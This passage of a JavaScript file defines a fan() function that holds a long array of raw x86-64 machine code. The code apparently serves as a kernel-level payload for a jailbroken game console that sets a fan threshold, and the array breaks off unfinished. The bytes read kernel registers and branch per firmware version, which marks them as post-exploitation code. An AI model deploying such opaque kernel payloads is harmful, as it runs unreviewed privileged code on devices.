function showMessage(msg) {
		document.getElementById("message").innerHTML = msg;
		document.getElementById("message").style.display = 'block';
	}

	function fan() {
		showMessage("Loading Fan Threshold...");
		var payload = [233, 0, 0, 0, 0, 65, 87, 65, 86, 65, 85, 65, 84, 85, 83, 72, 129, 236, 120, 14, 0, 0, 232, 74, 17, 0, 0, 232, 37, 11, 0, 0, 49, 192, 76, 141, 124, 36, 26, 232, 90, 9, 0, 0, 232, 146, 10, 0, 0, 49, 210, 49, 246, 72, 141, 61, 252, 20, 0, 0, 72, 141, 172, 36, 109, 6, 0, 0, 232, 138, 9, 0, 0, 76, 141, 164, 36, 109, 2, 0, 0, 72, 141, 29, 152, 29, 0, 0, 65, 137, 197, 133, 192, 72, 141, 68, 36, 72, 72, 137, 4, 36, 127, 97, 76, 137, 255, 185, 38, 0, 0, 0, 72, 141, 53, 33, 21, 0, 0, 199, 132, 36, 64, 2, 0, 0, 0, 0, 0, 0, 199, 132, 36, 104, 2, 0, 0, 0, 0, 0, 0, 76, 137, 250, 198, 132, 36, 108, 2, 0, 0, 1, 49, 192, 199, 132, 36, 80, 2, 0, 0, 255, 255, 255, 255, 243, 164, 72, 137, 239, 190, 0, 4, 0, 0, 255, 19, 72, 141, 21, 141, 20, 0, 0, 190, 0, 4, 0, 0, 76, 137, 231, 49, 192, 255, 19, 233, 188, 0, 0, 0, 76, 141, 53, 64, 28, 0, 0, 49, 192, 72, 141, 124, 36, 16, 185, 10, 0, 0, 0, 72, 141, 84, 36, 16, 243, 170, 65, 138, 6, 190, 7, 143, 28, 192, 68, 137, 239, 136, 68, 36, 21, 232, 86, 16, 0, 0, 68, 137, 239, 232, 224, 8, 0, 0, 65, 15, 182, 6, 185, 5, 0, 0, 0, 76, 137, 255, 72, 141, 53, 134, 20, 0, 0, 199, 132, 36, 64, 2, 0, 0, 0, 0, 0, 0, 199, 132, 36, 104, 2, 0, 0, 0, 0, 0, 0, 141, 4, 192, 198, 132, 36, 108, 2, 0, 0, 1, 153, 199, 132, 36, 80, 2, 0, 0, 255, 255, 255, 255, 247, 249, 185, 38, 0, 0, 0, 76, 137, 250, 243, 164, 131, 192, 32, 190, 0, 4, 0, 0, 197, 250, 42, 192, 72, 137, 239, 197, 250, 17, 68, 36, 12, 49, 192, 255, 19, 197, 250, 16, 68, 36, 12, 72, 141, 21, 5, 20, 0, 0, 65, 15, 182, 14, 190, 0, 4, 0, 0, 76, 137, 231, 49, 192, 197, 122, 44, 192, 255, 19, 72, 139, 60, 36, 49, 192, 185, 126, 0, 0, 0, 72, 199, 68, 36, 64, 0, 0, 0, 0, 72, 141, 108, 36, 64, 72, 141, 21, 189, 19, 0, 0, 190, 0, 2, 0, 0, 243, 171, 76, 137, 225, 72, 137, 239, 255, 19, 49, 201, 191, 89, 2, 0, 0, 65, 137, 196, 72, 137, 234, 49, 192, 190, 7, 0, 0, 0, 232, 61, 19, 0, 0, 72, 141, 5, 64, 27, 0, 0, 139, 56, 133, 255, 120, 11, 68, 137, 226, 72, 137, 238, 232, 75, 15, 0, 0, 72, 141, 5, 4, 31, 0, 0, 72, 141, 180, 36, 64, 2, 0, 0, 49, 201, 186, 48, 12, 0, 0, 49, 255, 255, 16, 72, 129, 196, 120, 14, 0, 0, 49, 192, 91, 93, 65, 92, 65, 93, 65, 94, 65, 95, 195, 72, 139, 71, 8, 73, 137, 241, 76, 139, 64, 72, 72, 139, 112, 64, 73, 139, 65, 8, 102, 139, 0, 102, 61, 43, 2, 15, 132, 172, 3, 0, 0, 15, 135, 8, 1, 0, 0, 102, 61, 218, 1, 15, 135, 180, 0, 0, 0, 102, 61, 213, 1, 119, 78, 102, 61, 151, 1, 15, 135, 139, 0, 0, 0, 102, 61, 143, 1, 119, 100, 102, 61, 99, 1, 15, 132, 1, 2, 0, 0, 102, 61, 114, 1, 15, 132, 23, 2, 0, 0, 102, 61, 94, 1, 15, 133, 124, 4, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 48, 63, 181, 0, 72, 5, 48, 21, 92, 1, 233, 214, 4, 0, 0, 102, 45, 215, 1, 102, 131, 248, 3, 15, 135, 159, 2, 0, 0, 72, 141, 21, 40, 19, 0, 0, 15, 183, 192, 72, 99, 4, 130, 185, 130, 0, 0, 192, 72, 1, 208, 255, 224, 102, 45, 144, 1, 102, 131, 248, 7, 15, 135, 40, 4, 0, 0, 72, 141, 21, 18, 19, 0, 0, 15, 183, 192, 72, 99, 4, 130, 72, 1, 208, 255, 224, 102, 61, 194, 1, 15, 132, 60, 2, 0, 0, 102, 61, 199, 1, 15, 132, 50, 2, 0, 0, 233, 252, 3, 0, 0, 102, 61, 251, 1, 119, 43, 102, 61, 243, 1, 15, 134, 236, 3, 0, 0, 102, 45, 244, 1, 102, 131, 248, 7, 15, 135, 222, 3, 0, 0, 72, 141, 21, 232, 18, 0, 0, 15, 183, 192, 72, 99, 4, 130, 72, 1, 208, 255, 224, 102, 61, 38, 2, 15, 132, 141, 2, 0, 0, 102, 61, 41, 2, 15, 132, 131, 2, 0, 0, 233, 178, 3, 0, 0, 102, 61, 189, 2, 15, 132, 43, 3, 0, 0, 119, 126, 102, 61, 139, 2, 15, 132, 232, 2, 0, 0, 119, 62, 102, 61, 90, 2, 15, 132, 156, 2, 0, 0, 119, 25, 102, 61, 44, 2, 15, 132, 112, 2, 0, 0, 102, 61, 88, 2, 15, 132, 134, 2, 0, 0, 233, 117, 3, 0, 0, 102, 61, 108, 2, 15, 132, 151, 2, 0, 0, 102, 61, 138, 2, 15, 132, 173, 2, 0, 0, 233, 92, 3, 0, 0, 102, 61, 160, 2, 15, 132, 181, 2, 0, 0, 119, 25, 102, 61, 158, 2, 15, 132, 169, 2, 0, 0, 102, 61, 159, 2, 15, 132, 159, 2, 0, 0, 233, 55, 3, 0, 0, 102, 61, 188, 2, 15, 132, 176, 2, 0, 0, 233, 40, 3, 0, 0, 102, 61, 33, 3, 15, 132, 225, 2, 0, 0, 119, 62, 102, 61, 239, 2, 15, 132, 181, 2, 0, 0, 119, 25, 102, 61, 190, 2, 15, 132, 137, 2, 0, 0, 102, 61, 238, 2, 15, 132, 159, 2, 0, 0, 233, 247, 2, 0, 0, 102, 61, 243, 2, 15, 132, 144, 2, 0, 0, 102, 61, 32, 3, 15, 132, 166, 2, 0, 0, 233, 222, 2, 0, 0, 102, 61, 84, 3, 15, 132, 183, 2, 0, 0, 119, 25, 102, 61, 35, 3, 15, 132, 139, 2, 0, 0, 102, 61, 82, 3, 15, 132, 161, 2, 0, 0, 233, 185, 2, 0, 0, 102, 61, 132, 3, 15, 133, 175, 2, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 176, 246, 17, 1, 72, 5, 96, 253, 30, 2, 233, 9, 3, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 240, 58, 181, 0, 72, 5, 48, 17, 92, 1, 233, 233, 2, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 16, 207, 181, 0, 72, 5, 64, 208, 92, 1, 233, 201, 2, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 16, 118, 193, 0, 72, 5, 80, 232, 213, 1, 233, 169, 2, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 224, 116, 193, 0, 72, 5, 32, 231, 213, 1, 233, 137, 2, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 208, 116, 193, 0, 72, 5, 16, 231, 213, 1, 233, 105, 2, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 208, 180, 193, 0, 72, 5, 16, 39, 214, 1, 233, 73, 2, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 224, 3, 211, 0, 72, 5, 96, 100, 234, 1, 233, 41, 2, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 112, 114, 211, 0, 72, 5, 160, 209, 234, 1, 233, 9, 2, 0, 0, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 224, 114, 211, 0, 72, 5, 16, 210, 234, 1, 233, 238, 1, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 224, 132, 9, 1, 72, 5, 48, 24, 44, 2, 233, 206, 1, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 224, 132, 9, 1, 72, 5, 176, 24, 44, 2, 233, 174, 1, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 192, 63, 19, 1, 72, 5, 176, 243, 46, 2, 233, 142, 1, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 192, 143, 19, 1, 72, 5, 176, 51, 47, 2, 233, 110, 1, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 152, 146, 19, 1, 72, 5, 0, 249, 27, 2, 233, 78, 1, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 152, 210, 19, 1, 72, 5, 0, 57, 28, 2, 233, 46, 1, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 56, 211, 19, 1, 235, 21, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 88, 227, 19, 1, 72, 5, 96, 1, 48, 2, 233, 247, 0, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 216, 225, 19, 1, 72, 5, 144, 85, 44, 2, 233, 215, 0, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 104, 181, 19, 1, 72, 5, 32, 98, 180, 1, 233, 183, 0, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 16, 166, 17, 1, 72, 5, 112, 197, 184, 1, 233, 151, 0, 0, 0, 185, 130, 0, 0, 192, 15, 50, 72, 193, 226, 32, 72, 9, 208, 72, 141, 136, 48, 167, 17, 1, 72, 5, 144, 95, 198, 1, 235, 122, 65, 84, 85, 72, 129, 236, 8, 2, 0, 0, 49, 192, 72, 141, 124, 36, 8, 185, 126, 0, 0, 0, 243, 171, 72, 141, 13, 222, 22, 0, 0, 72, 137, 229, 72, 199, 4, 36, 0, 0, 0, 0, 72, 141, 21, 154, 14, 0, 0, 190, 0, 2, 0, 0, 72, 137, 239, 255, 17, 49, 201, 191, 89, 2, 0, 0, 65, 137, 196, 72, 137, 234, 49, 192, 190, 7, 0, 0, 0, 232, 195, 13, 0, 0, 72, 141, 5, 198, 21, 0, 0, 139, 56, 133, 255, 120, 11, 68, 137, 226, 72, 137, 238, 232, 209, 9, 0, 0, 72, 129, 196, 8, 2, 0, 0, 131, 200, 255, 93, 65, 92, 195, 72, 139, 150, 24, 1, 0, 0, 72, 199, 70, 4, 0, 0, 0, 0, 199, 70, 20, 0, 0, 0, 0, 199, 2, 0, 0, 0, 0, 72, 139, 17, 72, 137, 86, 48, 72, 190, 19, 0, 0, 0, 0, 0, 1, 56, 72, 139, 0, 73, 137, 64, 32, 73, 137, 64, 24, 72, 139, 135, 48, 1, 0, 0, 72, 199, 64, 96, 255, 255, 255, 255, 72, 137, 112, 88, 72, 199, 64, 104, 255, 255, 255, 255, 49, 192, 195, 72, 141, 61, 90, 14, 0, 0, 186, 255, 1, 0, 0, 190, 1, 0, 0, 0, 81, 232, 249, 1, 0, 0, 137, 199, 49, 192, 133, 255, 120, 22, 232, 248, 1, 0, 0, 72, 141, 61, 54, 14, 0, 0, 232, 248, 1, 0, 0, 184, 1, 0, 0, 0, 90, 195, 65, 85, 65, 84, 85, 83, 72, 129, 236, 216, 0, 0, 0, 72, 141, 29, 10, 21, 0, 0, 102, 139, 3, 102, 133, 192, 15, 133, 94, 1, 0, 0, 76, 141, 37, 207, 21, 0, 0, 72, 141, 108, 36, 47, 72, 141, 21, 91, 25, 0, 0, 77, 139, 44, 36, 255, 18, 72, 137, 239, 72, 141, 21, 248, 13, 0, 0, 72, 137, 193, 190, 33, 0, 0, 0, 49, 192, 65, 255, 213, 49, 210, 49, 246, 72, 137, 239, 232, 125, 1, 0, 0, 133, 192, 137, 197, 121, 30, 49, 210, 49, 246, 72, 141, 61, 231, 13, 0, 0, 232, 103, 1, 0, 0, 133, 192, 137, 197, 121, 8, 131, 200, 255, 233, 254, 0, 0, 0, 49, 210, 49, 246, 137, 239, 232, 38, 2, 0, 0, 72, 141, 116, 36, 8, 186, 32, 0, 0, 0, 137, 239, 232, 37, 1, 0, 0, 72, 131, 248, 32, 117, 214, 15, 183, 116, 36, 32, 49, 210, 137, 239, 72, 255, 198, 72, 193, 230, 5, 73, 137, 245, 232, 247, 1, 0, 0, 72, 141, 116, 36, 80, 186, 64, 0, 0, 0, 137, 239, 232, 246, 0, 0, 0, 72, 131, 248, 64, 117, 167, 15, 183, 132, 36, 134, 0, 0, 0, 15, 183, 180, 36, 136, 0, 0, 0, 15, 175, 240, 15, 183, 132, 36, 132, 0, 0, 0, 72, 99, 246, 76, 1, 238, 72, 1, 198, 64, 246, 198, 15, 116, 5, 72, 255, 198, 235, 245, 49, 210, 137, 239, 232, 168, 1, 0, 0, 72, 141, 180, 36, 144, 0, 0, 0, 186, 64, 0, 0, 0, 137, 239, 232, 164, 0, 0, 0, 72, 131, 248, 64, 15, 133, 81, 255, 255, 255, 137, 239, 72, 141, 108, 36, 3, 232, 178, 0, 0, 0, 72, 139, 140, 36, 168, 0, 0, 0, 199, 68, 36, 3, 0, 0, 0, 0, 198, 68, 36, 7, 0, 72, 141, 21, 34, 13, 0, 0, 190, 5, 0, 0, 0, 72, 137, 239, 49, 192, 73, 137, 200, 72, 193, 233, 40, 73, 193, 232, 32, 15, 182, 201, 69, 15, 182, 192, 65, 255, 20, 36, 72, 141, 5, 232, 21, 0, 0, 72, 137, 239, 255, 16, 102, 137, 3, 72, 129, 196, 216, 0, 0, 0, 91, 93, 65, 92, 65, 93, 195, 72, 131, 236, 24, 49, 192, 232, 50, 254, 255, 255, 65, 137, 192, 49, 192, 69, 133, 192, 117, 27, 232, 90, 254, 255, 255, 72, 141, 61, 108, 248, 255, 255, 72, 141, 116, 36, 14, 102, 137, 68, 36, 14, 232, 163, 7, 0, 0, 72, 131, 196, 24, 195, 72, 199, 192, 3, 0, 0, 0, 233, 70, 11, 0, 0, 72, 199, 192, 4, 0, 0, 0, 233, 58, 11, 0, 0, 72, 199, 192, 5, 0, 0, 0, 233, 46, 11, 0, 0, 72, 199, 192, 6, 0, 0, 0, 233, 34, 11, 0, 0, 72, 199, 192, 10, 0, 0, 0, 233, 22, 11, 0, 0, 72, 199, 192, 9, 0, 0, 0, 233, 10, 11, 0, 0, 72, 199, 192, 58, 0, 0, 0, 233, 254, 10, 0, 0, 72, 199, 192, 57, 0, 0, 0, 233, 242, 10, 0, 0, 72, 199, 192, 21, 0, 0, 0, 233, 230, 10, 0, 0, 72, 199, 192, 122, 1, 0, 0, 233, 218, 10, 0, 0, 72, 199, 192, 22, 0, 0, 0, 233, 206, 10, 0, 0, 72, 199, 192, 123, 0, 0, 0, 233, 194, 10, 0, 0, 72, 199, 192, 124, 0, 0, 0, 233, 182, 10, 0, 0, 72, 199, 192, 128, 0, 0, 0, 233, 170, 10, 0, 0, 72, 199, 192, 136, 0, 0, 0, 233, 158, 10, 0, 0, 72, 199, 192, 137, 0, 0, 0, 233, 146, 10, 0, 0, 72, 199, 192, 188, 0, 0, 0, 233, 134, 10, 0, 0, 72, 199, 192, 189, 0, 0, 0, 233, 122, 10, 0, 0, 72, 199, 192, 190, 0, 0, 0, 233, 110, 10, 0, 0, 72, 199, 192, 16, 1, 0, 0, 233, 98, 10, 0, 0, 72, 199, 192, 222, 1, 0, 0, 233, 86, 10, 0, 0, 72, 199, 192, 237, 1, 0, 0, 233, 74, 10, 0, 0, 83, 72, 141, 29, 165, 18, 0, 0, 131, 59, 0, 117, 51, 72, 141, 5, 57, 22, 0, 0, 49, 210, 49, 246, 72, 141, 61, 148, 11, 0, 0, 69, 49, 201, 69, 49, 192, 49, 201, 255, 16, 72, 141, 21, 53, 18, 0, 0, 72, 141, 53, 162, 11, 0, 0, 137, 199, 137, 3, 232, 251, 5, 0, 0, 72, 141, 29, 70, 18, 0, 0, 131, 59, 0, 117, 52, 72, 141, 5, 250, 21, 0, 0, 49, 210, 49, 246, 72, 141, 61, 164, 11, 0, 0, 69, 49, 201, 69, 49, 192, 49, 201, 255, 16, 72, 141, 21, 14, 18, 0, 0, 72, 141, 53, 184, 11, 0, 0, 137, 3, 91, 137, 199, 233, 187, 5, 0, 0, 91, 195, 65, 84, 83, 86, 72, 141, 29, 56, 18, 0, 0, 131, 59, 0, 15, 133, 160, 5, 0, 0, 72, 141, 5, 176, 21, 0, 0, 69, 49, 201, 69, 49, 192, 49, 201, 49, 210, 49, 246, 72, 141, 61, 159, 11, 0, 0, 255, 16, 72, 141, 21, 76, 18, 0, 0, 72, 141, 53, 167, 11, 0, 0, 137, 199, 137, 3, 232, 114, 5, 0, 0, 139, 59, 72, 141, 53, 156, 11, 0, 0, 72, 141, 21, 236, 19, 0, 0, 232, 93, 5, 0, 0, 139, 59, 72, 141, 53, 140, 11, 0, 0, 72, 141, 21, 79, 18, 0, 0, 232, 72, 5, 0, 0, 139, 59, 72, 141, 53, 126, 11, 0, 0, 72, 141, 21, 178, 18, 0, 0, 232, 51, 5, 0, 0, 139, 59, 72, 141, 53, 113, 11, 0, 0, 72, 141, 21, 77, 19, 0, 0, 232, 30, 5, 0, 0, 139, 59, 72, 141, 53, 101, 11, 0, 0, 72, 141, 21, 248, 18, 0, 0, 232, 9, 5, 0, 0, 139, 59, 72, 141, 53, 87, 11, 0, 0, 72, 141, 21, 171, 17, 0, 0, 232, 244, 4, 0, 0, 139, 59, 72, 141, 53, 73, 11, 0, 0, 72, 141, 21, 118, 18, 0, 0, 232, 223, 4, 0, 0, 139, 59, 72, 141, 53, 59, 11, 0, 0, 72, 141, 21, 105, 17, 0, 0, 232, 202, 4, 0, 0, 139, 59, 72, 141, 53, 46, 11, 0, 0, 72, 141, 21, 100, 18, 0, 0, 232, 181, 4, 0, 0, 139, 59, 72, 141, 53, 35, 11, 0, 0, 72, 141, 21, 31, 17, 0, 0, 232, 160, 4, 0, 0, 139, 59, 72, 141, 53, 21, 11, 0, 0, 72, 141, 21, 2, 18, 0, 0, 232, 139, 4, 0, 0, 139, 59, 72, 141, 53, 8, 11, 0, 0, 72, 141, 21, 37, 17, 0, 0, 232, 118, 4, 0, 0, 139, 59, 72, 141, 53, 253, 10, 0, 0, 72, 141, 21, 152, 17, 0, 0, 232, 97, 4, 0, 0, 139, 59, 72, 141, 53, 239, 10, 0, 0, 72, 141, 21, 243, 17, 0, 0, 232, 76, 4, 0, 0, 139, 59, 72, 141, 53, 226, 10, 0, 0, 72, 141, 21, 166, 18, 0, 0, 232, 55, 4, 0, 0, 139, 59, 72, 141, 53, 212, 10, 0, 0, 72, 141, 21, 65, 18, 0, 0, 232, 34, 4, 0, 0, 139, 59, 72, 141, 53, 198, 10, 0, 0, 72, 141, 21, 124, 17, 0, 0, 232, 13, 4, 0, 0, 139, 59, 72, 141, 53, 185, 10, 0, 0, 72, 141, 21, 47, 18, 0, 0, 232, 248, 3, 0, 0, 139, 59, 72, 141, 53, 172, 10, 0, 0, 72, 141, 21, 138, 16, 0, 0, 232, 227, 3, 0, 0, 139, 59, 72, 141, 53, 160, 10, 0, 0, 72, 141, 21, 197, 16, 0, 0, 232, 206, 3, 0, 0, 139, 59, 72, 141, 53, 150, 10, 0, 0, 72, 141, 21, 88, 17, 0, 0, 232, 185, 3, 0, 0, 139, 59, 72, 141, 53, 136, 10, 0, 0, 72, 141, 21, 147, 16, 0, 0, 232, 164, 3, 0, 0, 76, 141, 37, 39, 17, 0, 0, 72, 141, 53, 117, 10, 0, 0, 139, 59, 76, 137, 226, 232, 140, 3, 0, 0, 139, 59, 72, 141, 53, 105, 10, 0, 0, 72, 141, 21, 238, 17, 0, 0, 232, 119, 3, 0, 0, 139, 59, 72, 141, 53, 91, 10, 0, 0, 72, 141, 21, 97, 16, 0, 0, 232, 98, 3, 0, 0, 139, 59, 72, 141, 53, 78, 10, 0, 0, 72, 141, 21, 156, 16, 0, 0, 232, 77, 3, 0, 0, 139, 59, 72, 141, 53, 64, 10, 0, 0, 72, 141, 21, 255, 16, 0, 0, 232, 56, 3, 0, 0, 139, 59, 76, 137, 226, 72, 141, 53, 11, 10, 0, 0, 232, 39, 3, 0, 0, 139, 59, 72, 141, 53, 34, 10, 0, 0, 72, 141, 21, 225, 16, 0, 0, 232, 18, 3, 0, 0, 139, 59, 72, 141, 53, 12, 10, 0, 0, 72, 141, 21, 12, 16, 0, 0, 232, 253, 2, 0, 0, 139, 59, 72, 141, 53, 254, 9, 0, 0, 72, 141, 21, 55, 17, 0, 0, 232, 232, 2, 0, 0, 139, 59, 72, 141, 53, 241, 9, 0, 0, 72, 141, 21, 50, 17, 0, 0, 232, 211, 2, 0, 0, 139, 59, 72, 141, 53, 225, 9, 0, 0, 72, 141, 21, 213, 15, 0, 0, 232, 190, 2, 0, 0, 139, 59, 72, 141, 53, 209, 9, 0, 0, 72, 141, 21, 16, 16, 0, 0, 232, 169, 2, 0, 0, 139, 59, 72, 141, 53, 196, 9, 0, 0, 72, 141, 21, 43, 15, 0, 0, 232, 148, 2, 0, 0, 139, 59, 72, 141, 53, 184, 9, 0, 0, 72, 141, 21, 158, 15, 0, 0, 232, 127, 2, 0, 0, 139, 59, 72, 141, 53, 174, 9, 0, 0, 72, 141, 21, 41, 16, 0, 0, 232, 106, 2, 0, 0, 139, 59, 72, 141, 53, 160, 9, 0, 0, 72, 141, 21, 220, 15, 0, 0, 232, 85, 2, 0, 0, 139, 59, 72, 141, 53, 145, 9, 0, 0, 72, 141, 21, 63, 16, 0, 0, 232, 64, 2, 0, 0, 139, 59, 72, 141, 53, 125, 9, 0, 0, 72, 141, 21, 130, 15, 0, 0, 232, 43, 2, 0, 0, 139, 59, 72, 141, 53, 109, 9, 0, 0, 72, 141, 21, 157, 14, 0, 0, 232, 22, 2, 0, 0, 139, 59, 72, 141, 53, 96, 9, 0, 0, 72, 141, 21, 224, 15, 0, 0, 232, 1, 2, 0, 0, 139, 59, 72, 141, 53, 69, 9, 0, 0, 72, 141, 21, 27, 15, 0, 0, 232, 236, 1, 0, 0, 139, 59, 72, 141, 53, 56, 9, 0, 0, 72, 141, 21, 22, 16, 0, 0, 232, 215, 1, 0, 0, 139, 59, 72, 141, 53, 28, 9, 0, 0, 72, 141, 21, 209, 15, 0, 0, 232, 194, 1, 0, 0, 139, 59, 72, 141, 53, 22, 9, 0, 0, 72, 141, 21, 20, 16, 0, 0, 232, 173, 1, 0, 0, 139, 59, 72, 141, 53, 8, 9, 0, 0, 72, 141, 21, 191, 15, 0, 0, 232, 152, 1, 0, 0, 139, 59, 72, 141, 53, 252, 8, 0, 0, 72, 141, 21, 106, 15, 0, 0, 232, 131, 1, 0, 0, 139, 59, 72, 141, 53, 241, 8, 0, 0, 72, 141, 21, 181, 15, 0, 0, 232, 110, 1, 0, 0, 139, 59, 72, 141, 53, 232, 8, 0, 0, 72, 141, 21, 160, 14, 0, 0, 232, 89, 1, 0, 0, 139, 59, 72, 141, 53, 218, 8, 0, 0, 72, 141, 21, 91, 15, 0, 0, 232, 68, 1, 0, 0, 139, 59, 72, 141, 53, 205, 8, 0, 0, 72, 141, 21, 22, 14, 0, 0, 232, 47, 1, 0, 0, 139, 59, 72, 141, 53, 192, 8, 0, 0, 72, 141, 21, 241, 13, 0, 0, 232, 26, 1, 0, 0, 139, 59, 72, 141, 53, 181, 8, 0, 0, 72, 141, 21, 140, 15, 0, 0, 232, 5, 1, 0, 0, 139, 59, 72, 141, 53, 168, 8, 0, 0, 72, 141, 21, 175, 13, 0, 0, 232, 240, 0, 0, 0, 139, 59, 72, 141, 53, 155, 8, 0, 0, 72, 141, 21, 162, 13, 0, 0, 232, 219, 0, 0, 0, 139, 59, 72, 141, 53, 144, 8, 0, 0, 72, 141, 21, 69, 15, 0, 0, 232, 198, 0, 0, 0, 139, 59, 72, 141, 53, 132, 8, 0, 0, 72, 141, 21, 16, 14, 0, 0, 232, 177, 0, 0, 0, 139, 59, 72, 141, 53, 117, 8, 0, 0, 72, 141, 21, 123, 13, 0, 0, 232, 156, 0, 0, 0, 139, 59, 72, 141, 53, 108, 8, 0, 0, 72, 141, 21, 94, 14, 0, 0, 232, 135, 0, 0, 0, 139, 59, 72, 141, 53, 93, 8, 0, 0, 72, 141, 21, 41, 14, 0, 0, 232, 114, 0, 0, 0, 139, 59, 72, 141, 53, 78, 8, 0, 0, 72, 141, 21, 180, 14, 0, 0, 232, 93, 0, 0, 0, 139, 59, 72, 141, 53, 64, 8, 0, 0, 72, 141, 21, 135, 13, 0, 0, 232, 72, 0, 0, 0, 139, 59, 72, 141, 53, 49, 8, 0, 0, 72, 141, 21, 42, 14, 0, 0, 232, 51, 0, 0, 0, 139, 59, 72, 141, 53, 34, 8, 0, 0, 72, 141, 21, 37, 14, 0, 0, 232, 30, 0, 0, 0, 139, 59, 72, 141, 53, 20, 8, 0, 0, 72, 141, 21, 48, 13, 0, 0, 89, 91, 65, 92, 233, 5, 0, 0, 0, 88, 91, 65, 92, 195, 72, 199, 192, 79, 2, 0, 0, 233, 3, 4, 0, 0, 72, 199, 192, 80, 2, 0, 0, 233, 247, 3, 0, 0, 72, 137, 241, 49, 210, 72, 137, 254, 69, 49, 192, 80, 191, 82, 2, 0, 0, 49, 192, 232, 220, 3, 0, 0, 90, 195, 72, 141, 5, 161, 14, 0, 0, 72, 99, 210, 49, 201, 72, 139, 0, 255, 224, 72, 199, 192, 37, 0, 0, 0, 233, 192, 3, 0, 0, 72, 199, 192, 54, 0, 0, 0, 233, 180, 3, 0, 0, 72, 199, 192, 11, 0, 0, 0, 233, 168, 3, 0, 0, 65, 84, 83, 86, 72, 141, 29, 248, 14, 0, 0, 131, 59, 0, 15, 133, 140, 3, 0, 0, 76, 141, 37, 104, 15, 0, 0, 72, 137, 222, 72, 141, 61, 123, 7, 0, 0, 73, 199, 4, 36, 0, 0, 0, 0, 232, 127, 255, 255, 255, 133, 192, 116, 34, 72, 137, 222, 72, 141, 61, 111, 7, 0, 0, 232, 108, 255, 255, 255, 133, 192, 116, 15, 72, 137, 222, 72, 141, 61, 111, 7, 0, 0, 232, 89, 255, 255, 255, 139, 59, 72, 141, 53, 116, 7, 0, 0, 72, 141, 21, 163, 14, 0, 0, 232, 44, 255, 255, 255, 139, 59, 72, 141, 53, 113, 7, 0, 0, 72, 141, 21, 206, 14, 0, 0, 232, 23, 255, 255, 255, 139, 59, 76, 137, 226, 72, 141, 53, 106, 7, 0, 0, 232, 6, 255, 255, 255, 139, 59, 72, 141, 53, 100, 7, 0, 0, 72, 141, 21, 192, 14, 0, 0, 232, 241, 254, 255, 255, 139, 59, 72, 141, 53, 94, 7, 0, 0, 72, 141, 21, 243, 14, 0, 0, 232, 220, 254, 255, 255, 139, 59, 72, 141, 53, 98, 7, 0, 0, 72, 141, 21, 14, 15, 0, 0, 232, 199, 254, 255, 255, 139, 59, 72, 141, 53, 107, 7, 0, 0, 72, 141, 21, 113, 14, 0, 0, 232, 178, 254, 255, 255, 139, 59, 72, 141, 53, 111, 7, 0, 0, 72, 141, 21, 28, 14, 0, 0, 232, 157, 254, 255, 255, 139, 59, 72, 141, 53, 119, 7, 0, 0, 72, 141, 21, 151, 14, 0, 0, 232, 136, 254, 255, 255, 139, 59, 72, 141, 53, 112, 7, 0, 0, 72, 141, 21, 234, 14, 0, 0, 232, 115, 254, 255, 255, 139, 59, 72, 141, 53, 105, 7, 0, 0, 72, 141, 21, 61, 14, 0, 0, 232, 94, 254, 255, 255, 139, 59, 72, 141, 53, 98, 7, 0, 0, 72, 141, 21, 80, 14, 0, 0, 232, 73, 254, 255, 255, 139, 59, 72, 141, 53, 92, 7, 0, 0, 72, 141, 21, 91, 14, 0, 0, 232, 52, 254, 255, 255, 139, 59, 72, 141, 53, 86, 7, 0, 0, 72, 141, 21, 182, 13, 0, 0, 232, 31, 254, 255, 255, 139, 59, 72, 141, 53, 80, 7, 0, 0, 72, 141, 21, 97, 14, 0, 0, 232, 10, 254, 255, 255, 139, 59, 72, 141, 53, 75, 7, 0, 0, 72, 141, 21, 84, 13, 0, 0, 232, 245, 253, 255, 255, 139, 59, 72, 141, 53, 76, 7, 0, 0, 72, 141, 21, 23, 14, 0, 0, 232, 224, 253, 255, 255, 139, 59, 72, 141, 53, 79, 7, 0, 0, 72, 141, 21, 106, 13, 0, 0, 232, 203, 253, 255, 255, 139, 59, 72, 141, 53, 81, 7, 0, 0, 72, 141, 21, 141, 13, 0, 0, 232, 182, 253, 255, 255, 139, 59, 72, 141, 53, 67, 7, 0, 0, 72, 141, 21, 64, 14, 0, 0, 232, 161, 253, 255, 255, 139, 59, 72, 141, 53, 59, 7, 0, 0, 72, 141, 21, 83, 13, 